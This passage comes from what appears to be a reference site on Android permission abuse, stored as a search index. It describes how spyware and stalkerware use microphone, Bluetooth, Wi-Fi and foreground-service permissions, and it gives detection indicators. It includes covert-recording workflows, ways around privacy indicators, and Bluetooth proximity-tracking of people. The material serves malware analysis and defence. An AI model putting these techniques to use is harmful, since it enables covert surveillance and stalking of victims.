Banking trojan with geofencing <p>In dynamic analysis, watch for <code>requestLocationUpdates()</code> calls with high frequency intervals (under 60 seconds) and <code>addGeofences()</code> calls that define regions matching known target countries.</p>"},{"location":"permissions/microphone/","title":"Microphone Permissions","text":"<p>Microphone access enables audio capture from the device's built-in microphones. In offensive use, this means ambient room recording, call recording, and environmental audio surveillance. The microphone is one of the highest-value collection targets in spyware because audio capture provides conversational content, environmental context, and biometric voiceprints.</p> <p>Every major commercial spyware platform (Pegasus, Predator, FinFisher) implements ambient audio recording. Stalkerware treats it as a core feature alongside location tracking and camera capture.</p>"},{"location":"permissions/microphone/#permissions","title":"Permissions","text":"Permission Abuse Potential RECORD_AUDIO Ambient recording, call recording, voice surveillance, environmental monitoring"},{"location":"permissions/microphone/#key-considerations","title":"Key Considerations","text":"<p>Like the camera group, the microphone group contains a single runtime permission. Effective abuse requires combining it with other capabilities:</p> Combo Purpose <code>RECORD_AUDIO</code> + <code>CAMERA</code> Video with audio surveillance <code>RECORD_AUDIO</code> + <code>READ_PHONE_STATE</code> Trigger recording on incoming/outgoing calls <code>RECORD_AUDIO</code> + <code>INTERNET</code> Real-time audio streaming or recorded file exfiltration <code>RECORD_AUDIO</code> + <code>FOREGROUND_SERVICE</code> (type <code>microphone</code>) Sustained recording from background (Android 14+) <code>RECORD_AUDIO</code> + <code>CAPTURE_AUDIO_OUTPUT</code> (system only) Record other apps' audio output including call audio"},{"location":"permissions/microphone/#covert-recording-techniques","title":"Covert Recording Techniques","text":"<p>Silent audio capture has fewer constraints than camera capture since there is no preview surface requirement. The main challenges are:</p> <ul> <li>Background execution: maintaining a recording session while the app is not in the foreground requires a foreground service, which shows a persistent notification</li> <li>Audio indicators: Android 12+ shows an orange dot when the microphone is active</li> <li>Power consumption: continuous recording drains battery noticeably</li> <li>Storage: raw audio generates significant data; malware compresses to opus/amr-nb before exfiltration</li> </ul> <p>Malware addresses the foreground service notification by using a minimal or misleading notification (e.g., \"Updating...\"), or by leveraging accessibility to dismiss the notification. On rooted devices, the foreground service requirement can be bypassed entirely.</p>"},{"location":"permissions/microphone/record-audio/","title":"RECORD_AUDIO","text":"<p>Grants access to the device microphone for audio capture. Used by spyware for ambient room recording, call recording, and environmental surveillance. Captures conversations, meetings, phone calls, and any sound within microphone range. A primary collection capability in both state-sponsored spyware and commercial stalkerware.</p>"},{"location":"permissions/microphone/record-audio/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECORD_AUDIO</code> Protection Level <code>dangerous</code> Permission Group <code>MICROPHONE</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/microphone/record-audio/#what-it-enables","title":"What It Enables","text":""},{"location":"permissions/microphone/record-audio/#mediarecorder","title":"MediaRecorder","text":"<pre><code>MediaRecorder recorder = new MediaRecorder();\nrecorder.setAudioSource(MediaRecorder.AudioSource.MIC);\nrecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);\nrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);\nrecorder.setOutputFile(outputPath);\nrecorder.prepare();\nrecorder.start();\n</code></pre> <p>Writes compressed audio directly to a file. Simplest approach but limited configuration.</p>"},{"location":"permissions/microphone/record-audio/#audiorecord","title":"AudioRecord","text":"<pre><code>int bufferSize = AudioRecord.getMinBufferSize(44100,\n    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);\nAudioRecord recorder = new AudioRecord(MediaRecorder.AudioSource.MIC,\n    44100, AudioFormat.CHANNEL_IN_MONO,\n    AudioFormat.ENCODING_PCM_16BIT, bufferSize);\nrecorder.startRecording();\n</code></pre> <p>Raw PCM access. Malware uses this for real-time audio streaming to C2 or for applying custom compression before storage.</p>"},{"location":"permissions/microphone/record-audio/#audio-sources","title":"Audio Sources","text":"Source Constant Captures <code>MIC</code> 1 Default microphone input <code>VOICE_UPLINK</code> 2 Outgoing call audio (restricted) <code>VOICE_DOWNLINK</code> 3 Incoming call audio (restricted) <code>VOICE_CALL</code> 4 Both sides of a call (restricted) <code>CAMCORDER</code> 5 Microphone optimized for video recording <code>VOICE_RECOGNITION</code> 6 Tuned for speech recognition <code>VOICE_COMMUNICATION</code> 7 Tuned for VoIP with echo cancellation <code>UNPROCESSED</code> 9 Raw, unprocessed audio (API 24+) <p><code>VOICE_UPLINK</code>, <code>VOICE_DOWNLINK</code>, and <code>VOICE_CALL</code> are restricted to system apps since Android 9. Third-party apps cannot directly record call audio through these sources.</p>"},{"location":"permissions/microphone/record-audio/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/microphone/record-audio/#ambient-room-recording","title":"Ambient Room Recording","text":"<p>The primary abuse case. Malware activates the microphone on schedule or on C2 command and records the surrounding environment. Captures conversations, meetings, and any audio within range.</p> <p>Typical implementation:</p> <ol> <li>C2 sends record command with duration</li> <li>Foreground service starts with minimal notification</li> <li><code>AudioRecord</code> captures raw PCM at 8kHz mono (minimizes file size)</li> <li>Audio encoded to AMR-NB or Opus for compression (8kHz AMR-NB produces roughly 1KB/second)</li> <li>Compressed file exfiltrated to C2</li> <li>Local file deleted</li> </ol> <p>Some families stream audio in real-time over a WebSocket or TCP connection rather than recording and uploading, reducing local forensic evidence.</p>"},{"location":"permissions/microphone/record-audio/#call-recording","title":"Call Recording","text":"<p>Recording phone calls from third-party apps has been progressively restricted:</p> Android Version Call Recording Status Pre-9 <code>VOICE_CALL</code> source available to third-party apps 9 (API 28) <code>VOICE_CALL</code>, <code>VOICE_UPLINK</code>, <code>VOICE_DOWNLINK</code> restricted to system apps 10 (API 29) <code>AudioRecord</code> during calls further restricted 11+ Accessibility-based call recording blocked for non-system apps <p>Malware workarounds for call recording on modern Android:</p> <ul> <li>Speakerphone capture: if the call is on speaker, <code>AudioSource.MIC</code> captures both sides of the conversation from the room</li> <li>Root + inject into incall process: with root, malware injects into the telephony stack or audio HAL to capture call audio directly</li> <li>Accessibility audio routing: deprecated and blocked in Android 11+</li> <li>System app spoofing: on rooted devices, install as a system app in <code>/system/priv-app/</code> to access restricted audio sources</li> </ul>"},{"location":"permissions/microphone/record-audio/#voice-activity-detection","title":"Voice Activity Detection","text":"<p>Sophisticated spyware implements VAD (Voice Activity Detection) to only record when speech is detected, conserving battery and storage:</p> <ol> <li>Continuous low-power monitoring of microphone input levels</li> <li>When amplitude exceeds a speech threshold, full recording begins</li> <li>Recording stops after a silence timeout</li> <li>Only segments containing speech are exfiltrated</li> </ol> <p>This dramatically reduces the volume of data while capturing all conversations.</p>"},{"location":"permissions/microphone/record-audio/#notable-families","title":"Notable Families","text":"Family Audio Usage Pegasus Ambient recording, call recording via exploit chain, real-time streaming Predator Ambient audio capture on C2 command FinSpy Scheduled ambient recording, call recording on rooted devices Hermit Ambient recording as lawful intercept capability KoSpy Audio recording via plugin, DPRK state-sponsored AridSpy Ambient recording, exfiltrated to C2 GuardZoo Audio recording targeting military personnel SpyNote Live audio streaming, call recording. Most deployed RAT. Rafel RAT Audio recording capability across 120+ campaigns PJobRAT Audio recording targeting Taiwan military Mandrake Ambient recording with environment profiling"},{"location":"permissions/microphone/record-audio/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>RECORD_AUDIO</code> introduced. No runtime prompt.</p> <p>Android 6.0 (API 23): runtime permission required. User must explicitly grant.</p> <p>Android 9 (API 28): background apps cannot access the microphone. A foreground service is required. <code>VOICE_CALL</code>, <code>VOICE_UPLINK</code>, and <code>VOICE_DOWNLINK</code> audio sources restricted to system apps only.</p> <p>Android 10 (API 29): foreground service must declare type <code>microphone</code> to access audio recording. Background microphone access without a foreground service silently returns empty audio buffers.</p> <p>Android 11 (API 30): one-time permissions. Users can grant microphone access for a single session only. Permission auto-revokes when the app moves to the background. Auto-reset of permissions for unused apps introduced, revoking <code>RECORD_AUDIO</code> after months of inactivity.</p> <p>Android 12 (API 31): privacy indicators. An orange dot appears in the status bar when the microphone is active. Quick settings toggle to globally disable the microphone hardware. Even with the permission granted, the mic returns silence when the toggle is off.</p> <p>Android 14 (API 34): foreground service type <code>microphone</code> must be declared both in the manifest and in <code>ServiceInfo</code> when starting the service. Missing declaration causes <code>SecurityException</code>.</p> <p>Android 15 (API 35): expanded enforcement of foreground service types and stricter background activity launch restrictions.</p>"},{"location":"permissions/microphone/record-audio/#evasion-of-privacy-indicators","title":"Evasion of Privacy Indicators","text":"<p>The Android 12+ microphone indicator (orange dot) presents the same challenge as the camera indicator:</p> Technique Status Root + system app privileges Bypass indicator, record as system process Short burst recording Indicator appears briefly; user may not notice Record only when screen is off Indicator not visible (but still present in quick settings) Exploit audio HAL directly Device-specific, requires kernel exploit Disable indicator via ADB <code>adb shell settings put</code> can suppress (requires prior access) <p>The quick settings panel reveals the accessing app even when the indicator dot is not immediately visible, so sophisticated users can detect active recording. However, most users do not check quick settings during normal phone use.</p>"},{"location":"permissions/microphone/record-audio/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.RECORD_AUDIO\" /&gt;\n</code></pre> <p>Static analysis indicators:</p> <ul> <li><code>AudioRecord</code> or <code>MediaRecorder</code> instantiation with <code>AudioSource.MIC</code> in a <code>Service</code> rather than an <code>Activity</code></li> <li>Audio encoding to AMR-NB or Opus in code without a visible recording UI</li> <li>WebSocket or raw TCP connections carrying audio-sized payloads</li> <li><code>RECORD_AUDIO</code> + <code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> combination</li> <li>Foreground service declared with type <code>microphone</code> but no user-facing audio feature in the app</li> <li>Audio file creation in app-private directories with deletion after network upload</li> </ul> <p>Runtime detection on Android 12+: the orange privacy indicator dot and the quick settings panel showing the accessing app.</p>"},{"location":"permissions/nearby-devices/","title":"Nearby Devices Permissions","text":"<p>Access to Bluetooth, Wi-Fi scanning, and Ultra-Wideband (UWB) for device discovery and communication. Introduced in Android 12 to replace the previous model where nearby device operations required location permissions.</p> <p>Security relevance: Bluetooth scanning reveals nearby devices and can be used for physical tracking. Wi-Fi scanning reveals nearby networks, which can be used for location inference. BLE beacons enable indoor tracking.</p>"},{"location":"permissions/nearby-devices/#permissions","title":"Permissions","text":"Permission Abuse Potential BLUETOOTH_SCAN Discover nearby Bluetooth devices, physical tracking via BLE beacons BLUETOOTH_ADVERTISE Broadcast BLE advertisements, impersonate devices BLUETOOTH_CONNECT Connect to paired Bluetooth devices, data exfiltration via Bluetooth NEARBY_WIFI_DEVICES Scan Wi-Fi networks, location inference from BSSID/SSID UWB_RANGING Ultra-Wideband distance measurement, precise indoor positioning"},{"location":"permissions/nearby-devices/#background","title":"Background","text":"<p>Before Android 12, Bluetooth and Wi-Fi scanning required <code>ACCESS_FINE_LOCATION</code> because scan results reveal the user's location (nearby BLE beacons, Wi-Fi BSSIDs map to known locations). Android 12 separated these into dedicated nearby device permissions, with an option to assert that the app won't derive location from scan results (<code>android:usesPermissionFlags=\"neverForLocation\"</code>).</p>"},{"location":"permissions/nearby-devices/#ble-beacon-tracking","title":"BLE Beacon Tracking","text":"<p>BLE (Bluetooth Low Energy) beacons broadcast fixed identifiers at regular intervals. A malicious app with <code>BLUETOOTH_SCAN</code> can passively collect these identifiers and correlate them with known beacon databases to determine the target's indoor location with meter-level precision:</p> <ul> <li>Retail environments deploy dense beacon networks for customer analytics -- a scanning app can map exact in-store movement</li> <li>Office buildings increasingly use BLE for access control and indoor navigation, creating a grid of trackable reference points</li> <li>Public transit systems embed BLE beacons at stations and on vehicles, enabling route reconstruction without GPS</li> <li>Custom-planted beacons -- an operator can deploy small BLE beacons (under $5 each) near a target's home, workplace, or vehicle, then detect proximity through the compromised phone app</li> </ul> <p>Unlike GPS, BLE tracking works indoors, underground, and in GPS-denied environments. It also consumes significantly less battery, making continuous scanning less likely to alert the target through unusual battery drain.</p>"},{"location":"permissions/nearby-devices/#bluetooth-exfiltration-channel","title":"Bluetooth Exfiltration Channel","text":"<p><code>BLUETOOTH_CONNECT</code> enables data exfiltration over Bluetooth as an alternative to internet-based channels. This is operationally relevant when:</p> <ul> <li>The target's network traffic is monitored by a corporate firewall or national-level DPI (deep packet inspection)</li> <li>The device has no internet connectivity (airplane mode, restricted network)</li> <li>The operator wants to avoid leaving any network-layer artifacts (DNS queries, IP connections)</li> </ul> <p>The exfiltration flow uses a nearby attacker-controlled device (phone, laptop, or Raspberry Pi) within Bluetooth range (~10m for standard BLE, up to ~100m with directional antennas). The implant establishes a Bluetooth serial connection or uses GATT (Generic Attribute Profile) to transfer collected data. This requires physical proximity, making it most practical for operations where the attacker has regular access to the target's environment -- a shared office, hotel, or regular meeting location.</p>"},{"location":"permissions/nearby-devices/#wi-fi-ssidbssid-for-indoor-positioning","title":"Wi-Fi SSID/BSSID for Indoor Positioning","text":"<p><code>NEARBY_WIFI_DEVICES</code> enables Wi-Fi network scanning that provides location data without GPS through two mechanisms:</p> <p>BSSID geolocation -- Every Wi-Fi access point broadcasts a unique BSSID (MAC address). Services like Google, Apple, and WiGLE maintain massive databases mapping BSSIDs to physical locations. A single Wi-Fi scan returning 5-10 visible BSSIDs can triangulate position to within 10-30 meters in urban areas.</p> <p>SSID fingerprinting -- The set of visible network names creates a location fingerprint. Even without a BSSID database, repeated observations of the same SSID set indicate the target is in the same location. A home network's SSID appearing in scan results confirms the target is home. A corporate SSID confirms they are at the office.</p> <p>This is why Android originally required <code>ACCESS_FINE_LOCATION</code> for Wi-Fi scanning -- the scan results are functionally equivalent to a GPS fix in populated areas.</p>"},{"location":"permissions/nearby-devices/#stalkerware-physical-proximity-via-ble","title":"Stalkerware: Physical Proximity via BLE","text":"<p>Stalkerware apps abuse <code>BLUETOOTH_SCAN</code> for a particularly invasive form of tracking -- detecting when specific Bluetooth devices are near the target's phone. The stalker registers the Bluetooth MAC addresses of devices belonging to specific people (a coworker, a friend, an ex-partner), and the stalkerware alerts whenever those devices appear in scan results.</p> <p>This enables the stalker to determine:</p> <ul> <li>Who the target is physically near, and how often</li> <li>Whether a specific person's device appears at the target's location outside expected hours</li> <li>When the target is near their own vehicle, home devices, or workplace peripherals</li> </ul> <p>Combined with continuous BLE scanning in the background, this creates a social proximity graph -- not just where the target goes, but who they are with.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/","title":"BLUETOOTH_ADVERTISE","text":"<p>Allows the device to broadcast BLE (Bluetooth Low Energy) advertisements, making it visible to nearby Bluetooth scanners. Limited abuse potential compared to scanning, but can be used for device impersonation or beacon spoofing.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BLUETOOTH_ADVERTISE</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12)"},{"location":"permissions/nearby-devices/bluetooth-advertise/#what-it-enables","title":"What It Enables","text":"<p>Broadcast custom BLE advertisements:</p> <pre><code>BluetoothLeAdvertiser advertiser = BluetoothAdapter.getDefaultAdapter().getBluetoothLeAdvertiser();\nAdvertiseData data = new AdvertiseData.Builder()\n    .addServiceUuid(ParcelUuid.fromString(\"your-service-uuid\"))\n    .build();\nadvertiser.startAdvertising(settings, data, callback);\n</code></pre>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/nearby-devices/bluetooth-advertise/#beacon-spoofing","title":"Beacon Spoofing","text":"<p>Broadcast fake BLE beacon advertisements to trigger actions in nearby devices or apps that respond to specific beacon UUIDs.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#p2p-malware-communication","title":"P2P Malware Communication","text":"<p>Infected devices could use BLE advertisements as a local communication channel between nearby infected devices, creating a mesh-like C2 that doesn't require internet access.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#device-tracking-enablement","title":"Device Tracking Enablement","text":"<p>If the infected device broadcasts a known BLE identifier, the attacker can track its physical location using their own BLE scanners.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BLUETOOTH_ADVERTISE\" /&gt;\n</code></pre> <p>Expected in IoT, wearable companion, and proximity-based apps. Unusual in other app categories.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/","title":"BLUETOOTH_CONNECT","text":"<p>Allows connecting to already-paired Bluetooth devices and accessing their data. Enables interacting with paired accessories, headphones, car systems, medical devices, and any other Bluetooth peripheral.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BLUETOOTH_CONNECT</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12)"},{"location":"permissions/nearby-devices/bluetooth-connect/#what-it-enables","title":"What It Enables","text":"<ul> <li>List paired devices via <code>BluetoothAdapter.getBondedDevices()</code></li> <li>Connect to paired devices (RFCOMM, L2CAP, GATT)</li> <li>Read device properties (name, type, battery level)</li> <li>Transfer data over Bluetooth profiles (A2DP, HFP, SPP, OBEX)</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-connect/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/nearby-devices/bluetooth-connect/#data-exfiltration-via-bluetooth","title":"Data Exfiltration via Bluetooth","text":"<p>Transfer stolen data to a nearby attacker-controlled device via Bluetooth, bypassing network monitoring entirely.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#paired-device-enumeration","title":"Paired Device Enumeration","text":"<p>List paired devices to identify:</p> <ul> <li>Car Bluetooth (reveals vehicle make/model)</li> <li>Medical devices (health information inference)</li> <li>Smart home devices (home automation fingerprinting)</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-connect/#obex-push","title":"OBEX Push","text":"<p>Send files to paired devices via OBEX Object Push Profile. Could be used to deliver payloads to other devices in proximity.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BLUETOOTH_CONNECT\" /&gt;\n</code></pre> <p>Common in legitimate apps that interact with Bluetooth accessories. Suspicious when combined with data collection permissions and no obvious Bluetooth functionality.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/","title":"BLUETOOTH_SCAN","text":"<p>Allows discovering nearby Bluetooth devices via BLE (Bluetooth Low Energy) and classic Bluetooth scanning. Scan results reveal nearby device names, MAC addresses, and BLE advertisement data, which can be used for physical tracking and location inference.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BLUETOOTH_SCAN</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12) <p>Before Android 12, Bluetooth scanning required <code>ACCESS_FINE_LOCATION</code>. Android 12 introduced <code>BLUETOOTH_SCAN</code> as a dedicated permission. Apps can declare <code>android:usesPermissionFlags=\"neverForLocation\"</code> to assert they won't use scan results for location inference, avoiding the location permission requirement.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#what-it-enables","title":"What It Enables","text":"<pre><code>BluetoothLeScanner scanner = BluetoothAdapter.getDefaultAdapter().getBluetoothLeScanner();\nscanner.startScan(new ScanCallback() {\n    @Override\n    public void onScanResult(int callbackType, ScanResult result) {\n        String deviceName = result.getDevice().getName();\n        String macAddress = result.getDevice().getAddress();\n        int rssi = result.getRssi();\n        byte[] scanRecord = result.getScanRecord().getBytes();\n    }\n});\n</code></pre> <p>Scan results contain:</p> Data Use Device name Identify device type and owner MAC address Persistent device identifier (randomized on modern devices) RSSI Signal strength, proximity estimation Advertisement data Service UUIDs, manufacturer data, beacon payloads Device type Classic Bluetooth, BLE, or dual-mode"},{"location":"permissions/nearby-devices/bluetooth-scan/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/nearby-devices/bluetooth-scan/#physical-tracking","title":"Physical Tracking","text":"<p>BLE beacons (iBeacon, Eddystone) are deployed in retail, transit, and public spaces. An app scanning for beacons can determine indoor location without GPS.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#device-fingerprinting","title":"Device Fingerprinting","text":"<p>Nearby Bluetooth devices (headphones, smartwatches, car systems) create a signature of the user's environment. This fingerprint persists even when the user changes location.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#location-inference","title":"Location Inference","text":"<p>Bluetooth scan results can be mapped to physical locations using databases of BLE beacon positions (maintained by Google, Apple, and commercial providers).</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BLUETOOTH_SCAN\" /&gt;\n</code></pre> <p>Check for <code>neverForLocation</code> flag. Without it, the app can use scan results for location, which may need additional scrutiny.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/","title":"NEARBY_WIFI_DEVICES","text":"<p>Allows discovering nearby Wi-Fi networks and performing Wi-Fi Direct operations. Wi-Fi scan results (SSIDs and BSSIDs) can be used for location inference since Wi-Fi access point positions are mapped in global databases.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.NEARBY_WIFI_DEVICES</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 33 (Android 13) <p>Before Android 13, Wi-Fi scanning required <code>ACCESS_FINE_LOCATION</code>. Like <code>BLUETOOTH_SCAN</code>, apps can declare <code>neverForLocation</code> to opt out of location derivation.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#what-it-enables","title":"What It Enables","text":"<ul> <li>Scan for nearby Wi-Fi networks (<code>WifiManager.startScan()</code>)</li> <li>Get scan results: SSID, BSSID, signal strength, frequency, channel</li> <li>Wi-Fi Direct (P2P) device discovery and connection</li> <li>Wi-Fi Aware (NAN) ranging and messaging</li> </ul>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/nearby-devices/nearby-wifi-devices/#location-without-gps","title":"Location Without GPS","text":"<p>Wi-Fi BSSIDs map to known geographic positions in databases maintained by Google, Apple, and commercial providers (WiGLE). Scanning nearby Wi-Fi networks reveals the device's location without GPS or location permissions (if <code>neverForLocation</code> is not declared).</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#network-reconnaissance","title":"Network Reconnaissance","text":"<p>Enumerate nearby Wi-Fi networks to:</p> <ul> <li>Identify enterprise networks (SSID naming patterns)</li> <li>Detect home network names</li> <li>Map network infrastructure for further attacks</li> </ul>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#wi-fi-direct-data-exfiltration","title":"Wi-Fi Direct Data Exfiltration","text":"<p>Use Wi-Fi Direct to transfer data to a nearby attacker-controlled device at high speed, bypassing internet-based monitoring.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.NEARBY_WIFI_DEVICES\" /&gt;\n</code></pre> <p>Check for <code>neverForLocation</code>. Without it, the app may derive location from Wi-Fi scan results.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/","title":"UWB_RANGING","text":"<p>Allows using Ultra-Wideband (UWB) radio for precise distance measurement and spatial awareness. UWB provides centimeter-level accuracy for ranging between devices, unlike Bluetooth or Wi-Fi which offer only rough proximity estimates.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.UWB_RANGING</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12) <p>UWB hardware is available on select devices: Pixel 6 Pro+, Samsung Galaxy S21+, and some other flagships.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#what-it-enables","title":"What It Enables","text":"<ul> <li>Measure precise distance and angle to other UWB-equipped devices</li> <li>Indoor positioning with centimeter-level accuracy</li> <li>Secure ranging for access control (digital car keys, smart locks)</li> </ul>"},{"location":"permissions/nearby-devices/uwb-ranging/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Limited real-world abuse due to hardware requirements and limited device support. Potential scenarios:</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#precision-tracking","title":"Precision Tracking","text":"<p>If both the target's device and the attacker's device have UWB, the attacker can determine exact distance and direction. This is significantly more precise than Bluetooth RSSI-based ranging.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#access-control-relay","title":"Access Control Relay","text":"<p>UWB is used for secure ranging in digital car keys and smart locks. A relay attack could potentially extend the UWB range, though UWB's time-of-flight design is specifically intended to resist relay attacks.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.UWB_RANGING\" /&gt;\n</code></pre> <p>Only expected in apps that interact with UWB peripherals (car keys, smart home, spatial audio). Very rare in the wild.</p>"},{"location":"permissions/normal/","title":"Normal Permissions (Abusable)","text":"<p>Permissions with <code>normal</code> protection level, granted automatically at install time with no user prompt. Most are harmless, but several are critical for malware persistence, reconnaissance, and operation.</p> <p>These permissions are the foundation of malware operation. They're invisible to the user during installation and provide the infrastructure layer that everything else depends on.</p>"},{"location":"permissions/normal/#permissions","title":"Permissions","text":"Permission Abuse Potential Criticality RECEIVE_BOOT_COMPLETED Persistence: auto-start after device reboot High: survives reboot INTERNET C2 communication, data exfiltration, required by virtually all malware Essential: no malware operates without it FOREGROUND_SERVICE Long-running background operations, persistent connections, continuous monitoring High: Android 8+ requires this for background work QUERY_ALL_PACKAGES App enumeration: identify installed security tools, banking apps for targeting High: drives overlay target selection REQUEST_IGNORE_BATTERY_OPTIMIZATIONS Prevent OS from killing background processes Medium: ensures persistent operation WAKE_LOCK Keep CPU active, ensure background operations complete Medium: prevents sleep during operations"},{"location":"permissions/normal/#why-normal-permissions-matter","title":"Why Normal Permissions Matter","text":"<p>A typical banking trojan's manifest contains 4-6 of these normal permissions. Combined, they provide:</p> <ul> <li>Persistence: <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> keeps the malware alive across reboots</li> <li>Communication: <code>INTERNET</code> enables C2 connectivity</li> <li>Targeting: <code>QUERY_ALL_PACKAGES</code> identifies which banking apps to overlay</li> <li>Reliability: <code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> + <code>WAKE_LOCK</code> prevents the OS from killing the malware process</li> </ul> <p>None of these trigger a user prompt. The user has no visibility into the malware receiving these capabilities.</p>"},{"location":"permissions/normal/foreground-service/","title":"FOREGROUND_SERVICE","text":"<p>Allows running a service with a persistent notification that the system prioritizes over background processes. Used by malware to maintain long-running operations: C2 connections, screen monitoring, SMS interception, and data exfiltration that must survive Android's background execution limits.</p>"},{"location":"permissions/normal/foreground-service/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.FOREGROUND_SERVICE</code> Protection Level <code>normal\\|instant</code> Grant Method Automatically at install time Introduced API 28 (Android 9.0) <p>Before Android 9, any app could call <code>startForeground()</code> without declaring this permission. Android 9 made the permission declaration mandatory.</p>"},{"location":"permissions/normal/foreground-service/#what-it-enables","title":"What It Enables","text":"<p>A foreground service runs with higher priority than regular background processes. Android will not kill it under memory pressure (or kills it last). The trade-off is a persistent notification visible to the user.</p> <pre><code>Notification notification = new Notification.Builder(this, CHANNEL_ID)\n    .setContentTitle(\"App Running\")\n    .setSmallIcon(R.drawable.icon)\n    .build();\nstartForeground(1, notification);\n</code></pre>"},{"location":"permissions/normal/foreground-service/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/foreground-service/#persistent-background-operation","title":"Persistent Background Operation","text":"<p>Combined with <code>RECEIVE_BOOT_COMPLETED</code>, this creates persistent malware that:</p> <ol> <li>Starts on boot via boot receiver</li> <li>Launches a foreground service</li> <li>Maintains C2 connection indefinitely</li> <li>Monitors foreground apps for overlay timing</li> <li>Survives most battery optimization kills</li> </ol>"},{"location":"permissions/normal/foreground-service/#notification-disguise","title":"Notification Disguise","text":"<p>Malware disguises the mandatory notification as something benign:</p> <ul> <li>\"Optimizing battery...\"</li> <li>\"Security scan in progress\"</li> <li>\"System update\"</li> <li>Minimized/transparent notification that's barely visible</li> </ul> <p>On Android 13+, users can long-press to dismiss foreground service notifications, but the service continues running.</p>"},{"location":"permissions/normal/foreground-service/#notable-families","title":"Notable Families","text":"Family Foreground Service Usage SpyNote Persistent notification disguised as system update, maintains RAT connectivity Gigabud Foreground service for continuous screen recording and data exfiltration BTMOB RAT Foreground service to maintain persistent C2 connection and screen streaming LightSpy Foreground service keeps modular surveillance plugins active"},{"location":"permissions/normal/foreground-service/#foreground-service-types","title":"Foreground Service Types","text":"<p>Android 10+ requires declaring the foreground service type:</p> Type Declaration Malware Use <code>location</code> <code>android:foregroundServiceType=\"location\"</code> Continuous GPS tracking <code>camera</code> <code>android:foregroundServiceType=\"camera\"</code> Covert recording <code>microphone</code> <code>android:foregroundServiceType=\"microphone\"</code> Audio surveillance <code>dataSync</code> <code>android:foregroundServiceType=\"dataSync\"</code> Data exfiltration <code>mediaPlayback</code> <code>android:foregroundServiceType=\"mediaPlayback\"</code> Disguise (no actual media) <code>connectedDevice</code> <code>android:foregroundServiceType=\"connectedDevice\"</code> Disguise <p>Android 14 (API 34) enforces type-specific permissions: a <code>camera</code> foreground service requires <code>CAMERA</code> permission to actually be granted.</p>"},{"location":"permissions/normal/foreground-service/#android-version-changes","title":"Android Version 